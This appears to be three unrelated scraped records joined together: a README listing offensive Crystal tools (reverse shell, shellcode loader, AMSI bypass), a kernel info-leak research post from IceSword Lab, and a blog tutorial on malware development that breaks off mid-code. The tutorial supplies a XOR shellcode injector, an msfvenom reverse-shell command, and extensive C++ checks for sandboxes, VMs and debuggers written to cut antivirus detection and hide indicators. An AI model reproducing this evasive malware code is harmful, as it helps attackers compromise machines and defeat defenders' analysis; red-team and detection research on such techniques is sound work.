{"text":"WeaponizeCrystal\n===\n> Experiments in weaponizing Crystal for offensive operations.\n\n\n## Working examples\n| Folder | Description | OS | Author |\n| ------ | ----------- | -- | ------ |\n| [reverse_shell](https:\/\/github.com\/js-on\/WeaponizeCrystal\/blob\/master\/reverse_shell\/) | reverse shell with the aim of simple use | *nix | [js-on](https:\/\/github.com\/js-on) |\n| [shellcode_loader](https:\/\/github.com\/js-on\/WeaponizeCrystal\/tree\/main\/shellcode_loader) | simple shellcode loader | *nix | [lap1nou](https:\/\/github.com\/lap1nou) |\n| [amsi_patch](https:\/\/github.com\/js-on\/WeaponizeCrystal\/tree\/main\/amsi_path) | x64 AMSI bypass | dos | [lap1nou](https:\/\/github.com\/lap1nou) |\n| [clr_hosting](https:\/\/github.com\/js-on\/WeaponizeCrystal\/tree\/main\/clr_hosting) | CLR hosting PoC to execute .NET DLL | dos | [lap1nou](https:\/\/github.com\/lap1nou) |\n| [port_scan](https:\/\/github.com\/js-on\/WeaponizeCrystal\/tree\/main\/port_scan) | simple single-threaded port scanner | *nix | [js-on](https:\/\/github.com\/js-on) |\n| ... | ... | ... |\n\n\n## Compiling\nSee the build instructions within the sample directory if given. Otherwise, see the build instructions provided by @CrystalLang itself: [crystal-lang.org](https:\/\/crystal-lang.org\/reference\/1.3\/using_the_compiler\/index.html)\n\n\n## Contributing\nIf you contribute a sample, I'll try to merge it asap. But please also add the required line to this [README.md](https:\/\/github.com\/js-on\/WeaponizeCrystal\/edit\/main\/README.md) file as well, so that we have a listing of all samples within this repository. Thanks ;)\n\n\n## Contributors\n- [js-on](https:\/\/github.com\/js-on) - creator and maintainer\n- [lap1nou](https:\/\/github.com\/lap1nou) - contributor\n\n\n## Other WeaponizeLang Projects\n- [OffensiveNim](https:\/\/github.com\/byt3bl33d3r\/OffensiveNim) by @[byt3bl33d3r](https:\/\/github.com\/byt3bl33d3r)\n"}
{"text":"#[1]IceSword Lab\n[2]IceSword Lab\n[3]Work hard in silence , let success make the noise.\n[4]Home [5]Archives [6]Research [7]Vulnerabilities [8]Recruitment\n[9]About\n____________________ (BUTTON) \uf002\n[10]2017-06-14\nAutomatically Discovering Windows Kernel Information Leak Vulnerabilities\nauthor : [11]fanxiaocao(@TinySecEx) and [12]@pjf_ of IceSword Lab ,\nQihoo 360\n__________________________________________________________________\nTL;DR\nThis Patch-Tuesday MS fixed 6 kernel information leak vulnerabilities\nreported by us, the details are at the end of this article.\nI had already show how to fuzz the windows kernel via JS , today we\nwill introduce a new method to discover windows kernel vulnerabilities\nautomatically without fuzzing.\nI selected a small part from the work in the past few months to spread\nout this topic.\nKASLR\nIn Windows Vista and above, Microsoft enable Kernel Address Space\nLayout Randomization (KASLR) by default to prevent exploitation by\nplacing various objects at random addresses, rather than fixed ones. It\nis an effective method against exploitation using Return-oriented\nProgramming (ROP) attack.\nBeginning with Windows 8, KASLR is enhanced with a newly introduced\nfunction ExIsRestrictedCaller.\nPrograms under medium integrity are not able to invoke functions such\nas NtQuerySystemInformation to obtain addresses of kernel modules,\nkernel objects or pools.\nThe functions include but not limited to:\nNtQuerySystemInformation\n* SystemModuleInformation\n* SystemModuleInformationEx\n* SystemLocksInformation\n* SystemStackTraceInformation\n* SystemHandleInformation\n* SystemExtendedHandleInformation\n* SystemObjectInformation\n* SystemBigPoolInformation\n* SystemSessionBigPoolInformation\n* SystemProcessInformation\n* SystemFullProcessInformation\nNtQueryInfomationThread\nNtQueryInfomationProcess\nThe above is the traditional way to get the kernel module address and\nkernel object address, as the kernel normal feature.\nBut after win8, low integrity application will fail in calling these\nfunctions.\nIn order to bypass KASLR, a direct countermeasure is to discover\nvulnerabilities that leak valuable information from the kernel mode to\ncalculate the address of kernel module or kernel object.\nKernel Information Leak\nAs a kind of kernel vulnerability, it has its own uniqueness. For\nexample, for the traditional memory damage vulnerabilities, the\nvulnerability itself will affect the running of the kernel. With the\nhelp of verifier and other tools, you can easily capture this exception\namong the normal traffic.\nBut the kernel information leak vulnerability does not trigger any\nexception, nor does it affect the running of the kernel, which makes it\nmore difficult to be discovered.\nVulnerabilities objectively exist, what we need to do is to find them\nat lowest cost.\nDiscover ideas\nWhen kernel information leak vulnerability occurs, the kernel will\ncertainly write some valuable data to the user buffer.\nSo if we monitor all the writing behaviors to user buffer in the\nkernel, we will be able to find them.\nOf course, the system does not provide this feature.\nI capture the process with the help of a hardware virtualization based\nframework of pjf,\nwho is the author of the famous windows kernel anti-rootkit tool named\niceSword.\nIn order not to affect the dest system itself, I monitored in the\nVMWARE guest and write some log files, and then further analyze them in\nthe host system.\nIn the host machine, after decoding and analyzing the logs:\nThen we have the human-readable logs:\nFurther Analysis\nNow we have operation records in user memory buffer written by kernel.\nMost of them are just normal functions.\nWe need remove nosiy data to find out the key information.\nTwo skills are needed.\nPoison the kernel stack\nPoisoning or polluting the target is a common idea.\nAt network penetration testing, there are also ARP and DNS cache\npoisoning.\nHere is the kernel stack poisoning, refers to the pollution to the\nentire unused kernel stack space.\nIf a variable on a kernel stack is not initialized, then when this\nvariable is written to the user buffer, there will be a magic value in\nthe record written by me. Wherever these is a magic value, there is a\nleak.\nI noticed that j00ru also used similar techniques in his BochsPwn\nproject.\nKiFastCallEntry Hook\nIn order to poison the kernel stack, I hooked nt!KiFastCallEntry.\nSo that when a syscall invoked, I can poisoning the entire unused\nkernel stack space.\nFirstly, I used ** IoGetStackLimits ** to get the current thread stack\nrange, and then from the bottom of the stack to the current stack\nlocation of the entire space are filled with 0xAA.\nSo when I entered the syscall, all the contents of the local variables\non the kernel stack will be filled into 0xAA.\nPoison the kernel pool\nSimilarly, for dynamically allocated memory, I used hook\nnt!ExAllocatePoolWithTag and so on, and polluted its POOL content.\nIf the kernel stack\/heap variable is not properly initialized, it is\npossible to write this magic value to the user buffer.\nWith the help of the logs we captured, we can immediately find this\nvulnerability.\nIn order to remove the coincidence, I also used a number of magic value\nsuch as 0xAAAAAAAA , 0xBBBBBBB to exclude false positives.\nA typical result after excluding the interference is as follows.\nYou can see that in a short monitoring process, it caught the ** 161 **\nleaks in the system!\nOf course, this is not exhaustive. There are not so many independent\nvulnerabilities, but some vulnerabilities made repeated leaks.\nAt this point we caught a real information leak vulnerability, there is\nstack information, supplemented by a simple manual analysis, we can got\nthe details.\nThis is also the story behind the CVE-2017-8482.\nDifference comparison\nFor the kernel information leak caused by the uninitialized stack, we\ncan poison them at first and then find them.\nBut for the direct disclosure of key information, such as the module\nand the object address written directly, it cannot be found in this\nway.\nIn the process of the system running, the kernel itself will frequently\nwrite data to the user buffer, a lot of data is in the kernel address\nrange, but in fact it is not a valid address, but a noise data.\nThere are many such noise data, such as strings, pixels, rect, region,\netc. which are likely happen to be a kernel address. We need to rule\nout the noise and found a real leak.\nHere we filter out some meaningful addresses, such as:\n1. Module address, must be inside in the system module list\n2. object address\n3. POOL address\nAfter the environment changes, such as restarting the system, it must\nbe able to leak the same type of data at the same location.\nAfter the exclusion of the normal function of the system, such as\nNtQuerySystemInformation and similar functions, the left data\u2019s\ncredibility is very high.\nThe leak of module address\nFor example CVE-2017-8485\nYou can see that the results at this time is very obvious - the same\nstack, the same location, are leaked nt!\nObpReferenceObjectByHandleWithTag + 0x19f\nThe leak of object address\nDue to leakage of object address and POOL address not fixed by\nMicrosoft this month, I cannot describe the details.\nMore\nYou can see that we do not need a fuzzer, only through the code\ncoverage generated by normal running of the system itself, we found\nthese vulnerabilities.\nAny normal program running can improve this coverage.\nIn fact, in the actual work, I only use the game and the browser to\nimprove coverage and got good results.\nA game finished, ten kernel vulnerabilities on the hand.\nThe case of this month\nCVE-2017-8470\nCVE-2017-8474\nCVE-2017-8476\nCVE-2017-8482\nCVE-2017-8485\nShare\n[13]Newer\n\u9ad8\u901a\u52a0\u89e3\u5bc6\u5f15\u64ce\u63d0\u6743\u6f0f\u6d1e\u89e3\u6790\n[14]Older\n\u81ea\u52a8\u5316\u6316\u6398 windows \u5185\u6838\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e\nArchives\n* [15]\u4e09\u6708 20231\n* [16]\u4e8c\u6708 20232\n* [17]\u4e03\u6708 20221\n* [18]\u4e8c\u6708 20221\n* [19]\u5341\u4e8c\u6708 20211\n* [20]\u4e5d\u6708 20211\n* [21]\u4e03\u6708 20201\n* [22]\u5341\u4e00\u6708 20191\n* [23]\u4e09\u6708 20191\n* [24]\u4e03\u6708 20181\n* [25]\u56db\u6708 20182\n* [26]\u4e8c\u6708 20181\n* [27]\u5341\u4e8c\u6708 20171\n* [28]\u5341\u6708 20172\n* [29]\u516b\u6708 20172\n* [30]\u516d\u6708 20172\nRecent Posts\n* [31]Linux \u5185\u6838\u5229\u7528\u6280\u5de7 Racing against the clock\n* [32]CVE-2022-1015 nf_tables \u63d0\u6743\u6f0f\u6d1e\u5206\u6790\n* [33]Linux \u5185\u6838\u5229\u7528\u6280\u5de7 Slab UAF to Page UAF\n* [34]CVE-2022-23222 eBPF verifier \u63d0\u6743\u6f0f\u6d1e\u5229\u7528\u5206\u6790\n* [35]CVE-2021-4034 pkexec \u672c\u5730\u63d0\u6743\u6f0f\u6d1e\u5229\u7528\u89e3\u6790\n\u00a9 2023 IceSword Lab\nPowered by [36]Hexo\n[37]Home [38]Archives [39]Research [40]Vulnerabilities [41]Recruitment\n[42]About"}
{"text":"#[1]0xPat blog - Red\/purple teamer\n[2]0xPat blog\nRed\/purple teamer\n[3]Blog [4]About\nMalware development part 2 - anti dynamic analysis & sandboxes\nIntroduction\nThis is the second post of a series which regards development of\nmalicious software. In this series we will explore and try to implement\nmultiple techniques used by malicious applications to execute code,\nhide from defenses and persist.\nPreviously, we\u2019ve created basic Metasploit shellcode launcher in C++\nand explored basic techniques which helped to lower detection rate of\nthe compiled executable - payload encoding\/encryption, binary signing\nwith custom code-signing certificate and switching to x64 architecture.\nNow let\u2019s dive deep into dynamic analysis and how to defend against it.\nNote: we assume 64-bit execution environment - some code samples may\nnot work for x86 applications (for example due to hardcoded 8-byte\npointer length or different data layout in PE and PEB). Also, error\nchecks and cleanups are ommited in the code samples below.\nDynamic analysis of malware\nDynamic analysis of an executable may be performed either automatically\nby a sandbox or manually by an analyst. Malicious applications often\nuse various methods to fingerprint the environment they\u2019re being\nexecuted in and perform different actions based on the situation.\nAutomated analysis is performed in a simplified sandbox environment\nwhich may have some specific traits, particularly it may not be able to\nemulate all nuances of the real environment. Manual analysis is usually\nperformed in a virtualized environment and specific additional tools\nmay be encountered (debugger, other analytic software).\nBoth automated and manual analysis have common characteristics, in\nparticular they are usually performed in a virtualized environment\nwhich can be easily detected if not configured (hardened) properly.\nMost sandbox\/analysis detection techniques revolve around checking\nspecific environment attributes (limited resources, indicative device\nnames) and artifacts (presence of specific files, registry keys).\nHowever there are several specific detections for automated sandboxes\nand other specific for virtual environments used by malware analysts.\nTesting detection\nWe will use the piece of code from [5]Malware development part 1 which\ninjects XOR-decrypted shellcode into newly allocated memory block and\nexecutes it:\nvoid main()\n{\nconst char shellcode[] = \"\\xc9\\x7d\\xb6 (...) \";\nPVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT|MEM_\nRESERVE, PAGE_EXECUTE_READWRITE);\nRtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);\nDWORD threadID;\nfor (int i = 0; i < sizeof shellcode; i++)\n{\n((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) ^ '\\x3\n5';\n}\nHANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_\nexec, NULL, 0, &threadID);\nWaitForSingleObject(hThread, INFINITE);\n}\nTo bypass some static detections, the application targets x64\narchitecture and is signed with a custom certificate.\nThis time however we use reverse shell shellcode:\nmsfvenom -p windows\/x64\/shell_reverse_tcp LPORT=4444\nLHOST=192.168.200.102 -f raw\nWe will check if the IP address of reverse shell handler (which is a\nvery basic IoC in this case) will be extracted during dynamic analysis.\nUsing AV evasion techniques described in the previous article we get\nalready low detection rate on VirusTotal:\nVT check\nMicrosoft Defender detects the \u201cMeterpreter trojan\u201d (actually it\u2019s just\na reverse TCP shell, not a Meterpreter shell). VT sandbox is able to\nextract IP address during dynamic analysis.\nLet\u2019s start with generic techniques for dynamic analysis detection and\nbypassing.\nDetecting virtualized environment\nBoth sandboxes and analyst\u2019s virtualized OSes usually can\u2019t 100%\naccurately emulate actual execution environment (like typical user\nworkstation). Virtualized environments have limited resources\n(corresponding device names can also provide useful information), may\nhave VM-specific tools and drivers installed, often look like a fresh\nWindows installation and sometimes use hardcoded user or computer\nnames. We can take advantage of that.\nHardware resources\nThe main problem are limited resources - a sandbox may not be able to\nrun long and consuming simulations in parallel so is often restricts\nresources commited and time allocated for a single instance. Regular VM\nboxes used by analysts are also subject for same constraints - they\noften have their resources limited.\nTypical user workstation has a processor with at least 2 cores, a\nminimum of 2 GB of RAM and a 100 GB hard drive. We can verify if the\nenvironment our malicious application is being executed in is a subject\nto these constrains:\n\/\/ check CPU\nSYSTEM_INFO systemInfo;\nGetSystemInfo(&systemInfo);\nDWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;\nif (numberOfProcessors < 2) return false;\n\/\/ check RAM\nMEMORYSTATUSEX memoryStatus;\nmemoryStatus.dwLength = sizeof(memoryStatus);\nGlobalMemoryStatusEx(&memoryStatus);\nDWORD RAMMB = memoryStatus.ullTotalPhys \/ 1024 \/ 1024;\nif (RAMMB < 2048) return false;\n\/\/ check HDD\nHANDLE hDevice = CreateFileW(L\"\\\\\\\\.\\\\PhysicalDrive0\", 0, FILE_SHARE_READ | FILE\n_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);\nDISK_GEOMETRY pDiskGeometry;\nDWORD bytesReturned;\nDeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry,\nsizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);\nDWORD diskSizeGB;\ndiskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCy\nlinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSec\ntor \/ 1024 \/ 1024 \/ 1024;\nif (diskSizeGB < 100) return false;\nUsing these simple checks we were able to drop the detection rate to\nzero:\nVT hardware check\nDynamic analysis performed by VirusTotal sandbox didn\u2019t provide any IPs\n(IoCs). That was easy :)\nDevices and vendor names\nOn default VM installations devices often have predictable names, for\nexample containing strings associated with the specific hypervisor. We\ncan check for hard drive name, optical disk drive name, BIOS version,\ncomputer manufacturer and model name, graphics controller name etc.\nRelevant information can be retrieved with WMI queries (check\nproperties like \u201cName\u201d, \u201cDescription\u201d, \u201cCaption\u201d).\nBelow you can see an example of HDD name retrieval using native Windows\nAPI functions (without WMI):\nHDEVINFO hDeviceInfo = SetupDiGetClassDevs(&GUID_DEVCLASS_DISKDRIVE, 0, 0, DIGCF\n_PRESENT);\nSP_DEVINFO_DATA deviceInfoData;\ndeviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);\nSetupDiEnumDeviceInfo(hDeviceInfo, 0, &deviceInfoData);\nDWORD propertyBufferSize;\nSetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNA\nME, NULL, NULL, 0, &propertyBufferSize);\nPWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBuf\nferSize);\nSetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNA\nME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);\nCharUpperW(HDDName);\nif (wcsstr(HDDName, L\"VBOX\")) return false;\nWe can also look for specific virtual devices that would not be present\nin a typical host system, like pipes and other interfaces used for\nguest-host communication:\nOBJECT_ATTRIBUTES objectAttributes;\nUNICODE_STRING uDeviceName;\nRtlSecureZeroMemory(&uDeviceName, sizeof(uDeviceName));\nRtlInitUnicodeString(&uDeviceName, L\"\\\\Device\\\\VBoxGuest\"); \/\/ or pipe: L\"\\\\??\\\\\npipe\\\\VBoxTrayIPC-<username>\"\nInitializeObjectAttributes(&objectAttributes, &uDeviceName, OBJ_CASE_INSENSITIVE\n, 0, NULL);\nHANDLE hDevice = NULL;\nIO_STATUS_BLOCK ioStatusBlock;\nNTSTATUS status = NtCreateFile(&hDevice, GENERIC_READ, &objectAttributes, &ioSta\ntusBlock, NULL, 0, 0, FILE_OPEN, 0, NULL, 0);\nif (NT_SUCCESS(status)) return false;\nWe should also pay attention to network devices. Especially MAC\naddresses can indicate presence of a virtual environment since first 3\nbytes are manufacturer identificator by default. Let\u2019s iterate all\navailable network adapters and compare first bytes with well-known\nvalues:\nDWORD adaptersListSize = 0;\nGetAdaptersAddresses(AF_UNSPEC, 0, 0, 0, &adaptersListSize);\nIP_ADAPTER_ADDRESSES* pAdaptersAddresses = (IP_ADAPTER_ADDRESSES*)HeapAlloc(GetP\nrocessHeap(), HEAP_ZERO_MEMORY, adaptersListSize);\nif (pAdaptersAddresses)\n{\nGetAdaptersAddresses(AF_UNSPEC, 0, 0, pAdaptersAddresses, &adaptersListS\nize);\nchar mac[6] = { 0 };\nwhile (pAdaptersAddresses)\n{\nif (pAdaptersAddresses->PhysicalAddressLength == 6)\n{\nmemcpy(mac, pAdaptersAddresses->PhysicalAddress, 6);\nif (!memcmp({ \"\\x08\\x00\\x27\" }, mac, 3)) return false;\n}\npAdaptersAddresses = pAdaptersAddresses->Next;\n}\n}\nVM-specific artifacts\nThere are also specific artifacts present on virtualized environments -\nfiles and registry entries indicating presence of a hypervisor. We can\ncheck for files and directories associated with drivers, devices and\nmodules provided by the hypervisor and registry keys and values\ncontaining configurations or hardware description.\nList of directories worth checking for these artifacts include\nC:\\Windows\\System32 and C:\\Windows\\System32\\Drivers. Interesting\nregistry keys are HKLM\\SYSTEM\\ControlSet001\\Services,\nHKLM\\HARDWARE\\Description\\System,\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation and others.\nBelow is the example code for probing VirtualBox-specific file and\nregistry key:\n\/\/ check files\nWIN32_FIND_DATAW findFileData;\nif (FindFirstFileW(L\"C:\\\\Windows\\\\System32\\\\VBox*.dll\", &findFileData) != INVALI\nD_HANDLE_VALUE) return false;\n\/\/ check registry key\nHKEY hkResult;\nif (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L\"SYSTEM\\\\ControlSet001\\\\Services\\\\VBoxSF\"\n, 0, KEY_QUERY_VALUE, &hkResult) == ERROR_SUCCESS) return false;\nFile, directory, process and window names\nThese methods can be used to detect sandbox, virtual machine, debugger\nor manual analysis environment in general. There are specific\napplications (and associated process and window names and loaded\nlibraries) that should not be used by a regular user.\nApplication name and directory\nNames of binaries analyzed in sandboxes are sometimes changed to\ngeneric ones like for example sample.exe. Malware analysts may also\nrename the file before executing. We can check if file or directory\nname contains \u201csuspicious\u201d character strings. However when we are\ncertain about the name and the path of the executable (e.g. when it is\ndropped by VBA macro) we can verify if it is indeed executed from\nassumed location:\nwchar_t currentProcessPath[MAX_PATH + 1];\nGetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);\nCharUpperW(currentProcessPath);\nif (!wcsstr(currentProcessPath, L\"C:\\\\USERS\\\\PUBLIC\\\\\")) return false;\nif (!wcsstr(currentProcessPath, L\"MALWARE.EXE\")) return false;\nParent process\nSometimes we can assume that the application should be started by a\nspecific process, like explorere.exe or svchost.exe. Or that it should\nnot be started by for example a debugger. We can put a condition based\non the parent process name:\nDWORD GetParentPID(DWORD pid)\n{\nDWORD ppid = 0;\nPROCESSENTRY32W processEntry = { 0 };\nprocessEntry.dwSize = sizeof(PROCESSENTRY32W);\nHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\nif (Process32FirstW(hSnapshot, &processEntry))\n{\ndo\n{\nif (processEntry.th32ProcessID == pid)\n{\nppid = processEntry.th32ParentProcessID;\nbreak;\n}\n} while (Process32NextW(hSnapshot, &processEntry));\n}\nCloseHandle(hSnapshot);\nreturn ppid;\n}\nvoid main()\n{\nDWORD parentPid = GetParentPID(GetCurrentProcessId());\nWCHAR parentName[MAX_PATH + 1];\nDWORD dwParentName = MAX_PATH;\nHANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid\n);\nQueryFullProcessImageNameW(hParent, 0, parentName, &dwParentName); \/\/ an\nother way to get process name is to use 'Toolhelp32Snapshot'\nCharUpperW(parentName);\nif (wcsstr(parentName, L\"WINDBG.EXE\")) return;\nwprintf_s(L\"Now hacking...\\n\");\n}\nRunning processes\nWe can enumerate all existing processes and check for typical analysis\ntools like Wireshark, Procmon, x64dbg, IDA etc.\nPROCESSENTRY32W processEntry = { 0 };\nprocessEntry.dwSize = sizeof(PROCESSENTRY32W);\nHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\nWCHAR processName[MAX_PATH + 1];\nif (Process32FirstW(hSnapshot, &processEntry))\n{\ndo\n{\nStringCchCopyW(processName, MAX_PATH, processEntry.szExeFile);\nCharUpperW(processName);\nif (wcsstr(processName, L\"WIRESHARK.EXE\")) exit(0);\n} while (Process32NextW(hSnapshot, &processEntry));\n}\nwprintf_s(L\"Now hacking...\\n\");\nLoaded libraries\nJust like with processes, we can enumerate modules loaded in each\nprocess\u2019 address space and check for unwanted names:\nDWORD runningProcessesIDs[1024];\nDWORD runningProcessesBytes;\nEnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcesse\nsBytes);\nfor (int i = 0; i < runningProcessesBytes \/ sizeof(DWORD); i++)\n{\nHANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_REA\nD, FALSE, runningProcessesIDs[i]);\nif (!hProcess) continue;\nHMODULE processModules[1024];\nDWORD processModulesBytes;\nint s1 = EnumProcessModules(hProcess, processModules, sizeof(processModu\nles), &processModulesBytes);\nfor (int j = 0; j < processModulesBytes \/ sizeof(HMODULE); j++)\n{\nWCHAR moduleName[MAX_PATH + 1];\nGetModuleFileNameExW(hProcess, processModules[j], moduleName, MA\nX_PATH);\nCharUpperW(moduleName);\nif (wcsstr(moduleName, L\"DBGHELP.DLL\")) exit(0);\n}\n}\nwprintf_s(L\"Now hacking...\\n\");\nWindows names\nLet\u2019s also check window names and compare them with names indicating\nthe presence of common malware analysis tools:\nBOOL CALLBACK EnumWindowsProc(HWND hWindow, LPARAM parameter)\n{\nWCHAR windowTitle[1024];\nGetWindowTextW(hWindow, windowTitle, sizeof(windowTitle));\nCharUpperW(windowTitle);\nif (wcsstr(windowTitle, L\"SYSINTERNALS\")) *(PBOOL)parameter = true;\nreturn true;\n}\nvoid main()\n{\nbool debugged = false;\nEnumWindows(EnumWindowsProc, (LPARAM)(&debugged));\nif (debugged) return;\nwprintf_s(L\"Now hacking...\\n\");\n}\nUser, computer and domain names\nBoth sandboxes and analysts usuall use computer and user names which\nare not likely to be encountered on a typical workstation, like Admin,\nAdministrator, ADMIN-PC etc. Also, default machine names following the\npattern DESKTOP-[0-9A-Z]{7} (or other similar patterns with random\ncharacters) are rarely present in corporate environments. We can\ncompare these names with known character strings:\n\/\/check computer name\nDWORD computerNameLength = MAX_COMPUTERNAME_LENGTH + 1;\nwchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];\nGetComputerNameW(computerName, &computerNameLength);\nCharUpperW(computerName);\nif (wcsstr(computerName, L\"DESKTOP-\")) return false;\n\/\/check user name\nDWORD userNameLength = UNLEN;\nwchar_t userName[UNLEN + 1];\nGetUserNameW(userName, &userNameLength);\nCharUpperW(userName);\nif (wcsstr(userName, L\"ADMIN\")) return false;\nSince we are usually targeting corporate environments, we can assume\nthat the user\u2019s computer is a member of a domain. Let\u2019s check domain\njoin status of the machine:\nPWSTR domainName;\nNETSETUP_JOIN_STATUS status;\nNetGetJoinInformation(NULL, &domainName, &status);\nif (status != NetSetupDomainName) return false;\nScreen resolution\nVirtualized environments rarely use multiple monitors (especially\nsandboxes). Virtual displays may also have non-typical screen sizes\n(especially when fitted to the host screen but not in fullscreen mode -\nmind the hypervisor window with bars and tabs).\nThis code sample is a bit more complicated. First we check if the\nprimary display has low resolution. If this check is passed, we\nenumerate all displays. EnumDisplayMonitors function requires a\nuser-defined callback function which it calls for every monitor\nenumerated providing a handle to the monitor as a parameter. The\ncallback is defined to check every monitor resolution (if it\u2019s standard\nor not) and provide results to a common variable. If any monitor has\nuncommon width or height, the application decides that it\u2019s being\nexecuted in a virtualized environment.\nbool CALLBACK MyCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARA\nM data)\n{\nMONITORINFO monitorInfo;\nmonitorInfo.cbSize = sizeof(MONITORINFO);\nGetMonitorInfoW(hMonitor, &monitorInfo);\nint xResolution = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.le\nft;\nint yResolution = monitorInfo.rcMonitor.top - monitorInfo.rcMonitor.bott\nom;\nif (xResolution < 0) xResolution = -xResolution;\nif (yResolution < 0) yResolution = -yResolution;\nif ((xResolution != 1920 && xResolution != 2560 && xResolution != 1440)\n|| (yResolution != 1080 && yResolution != 1200 && yResolution !=\n1600 && yResolution != 900))\n{\n*((BOOL*)data) = true;\n}\nreturn true;\n}\nvoid main()\n{\nMONITORENUMPROC pMyCallback = (MONITORENUMPROC)MyCallback;\nint xResolution = GetSystemMetrics(SM_CXSCREEN);\nint yResolution = GetSystemMetrics(SM_CYSCREEN);\nif (xResolution < 1000 && yResolution < 1000)  return false;\nint numberOfMonitors = GetSystemMetrics(SM_CMONITORS);\nbool sandbox = false;\nEnumDisplayMonitors(NULL, NULL, pMyCallback, (LPARAM)(&sandbox));\nif (sandbox) return;\nwprintf_s(L\"Now hacking...\\n\");\n}\nThis allowed to lower the detection rate a little bit (the file was\nflagged as \u201cunsafe\u201d instead of \u201cMeterpreter\u201d) and made it impossible to\nfully analyze the executable (IP IoCs were not extracted):\nVT monitor check\n\u201cSeasoned\u201d systems\nVirtual environments often look like fresh Windows installation. They\nmay lack some artifacts that appear over time on a typical workstation.\nA good example is number of USB storage devices mounted in the systems\nwhich is stored in the registry. We can check if a USB storage was ever\nmounted on the system:\nHKEY hKey;\nDWORD mountedUSBDevicesCount;\nRegOpenKeyEx(HKEY_LOCAL_MACHINE, L\"SYSTEM\\\\ControlSet001\\\\Enum\\\\USBSTOR\", 0, KEY\n_READ, &hKey);\nRegQueryInfoKey(hKey, NULL, NULL, NULL, &mountedUSBDevicesCount, NULL, NULL, NUL\nL, NULL, NULL, NULL, NULL);\nif (mountedUSBDevicesCount < 1) return false;\nThis check also allowed to lower the detection rate (the file was\nflagged as \u201cunsafe\u201d by Cylance) and thwarted network IoCs analysis.\nVT USB check\nTime zone\nWhen we target specific users or ogranization, we can prevent our code\nfrom being executed in an environment having the time zone set to a\ndifferent value than our target. Make sure the system time zone name is\nnot dependent on the system language.\nSetThreadLocale(MAKELCID(MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), SORT_DEFA\nULT));\nDYNAMIC_TIME_ZONE_INFORMATION dynamicTimeZoneInfo;\nGetDynamicTimeZoneInformation(&dynamicTimeZoneInfo);\nwchar_t timeZoneName[128 + 1];\nStringCchCopyW(timeZoneName, 128, dynamicTimeZoneInfo.TimeZoneKeyName);\nCharUpperW(timeZoneName);\nif (!wcsstr(timeZoneName, L\"CENTRAL EUROPEAN STANDARD TIME\")) return false;\nAgain, lower detection rate and no IoCs:\nVT time check\nDetecting automated analysis\nThere are several evasions specific to automated sandboxes. They are\nbased on particularly limited resources available in sandbox\nenvironments. Such execution environments often lack actual Internet\nconnection and user interaction.\nInternet connection\nSandboxes usually do not provide Internet connection however they may\nsimulate valid responses from remote servers. Let\u2019s see when we make\nshellcode execution dependent on the result of a HTTP request:\nHINTERNET hSession = WinHttpOpen(L\"Mozilla 5.0\", WINHTTP_ACCESS_TYPE_AUTOMATIC_P\nROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);\nHINTERNET hConnection = WinHttpConnect(hSession, L\"my.domain.or.ip\", INTERNET_DE\nFAULT_HTTP_PORT, 0);\nHINTERNET hRequest = WinHttpOpenRequest(hConnection, L\"GET\", L\"test\", NULL, WINH\nTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);\nWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUES\nT_DATA, 0, 0, 0);\nBOOL status = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WIN\nHTTP_NO_REQUEST_DATA, 0, 0, 0);\nif (!status) return false;\nAnalysis results were slightly better (for us) than without HTTP\nconnection checking. IP IoCs were not extracted by VT sandbox.\nVT http check\nSingle HTTP request was received on the target server. This means that\nsome systems extend the analysis to the \u201creal world\u201d.\nWe can further develop this evasion method and execute the shellcode\nonly after receiving a specific response:\nHINTERNET hSession = WinHttpOpen(L\"Mozilla 5.0\", WINHTTP_ACCESS_TYPE_AUTOMATIC_P\nROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);\nHINTERNET hConnection = WinHttpConnect(hSession, L\"my.domain.or.ip\", INTERNET_DE\nFAULT_HTTP_PORT, 0);\nHINTERNET hRequest = WinHttpOpenRequest(hConnection, L\"GET\", L\"test\", NULL, WINH\nTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);\nWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUES\nT_DATA, 0, 0, 0);\nWinHttpReceiveResponse(hRequest, 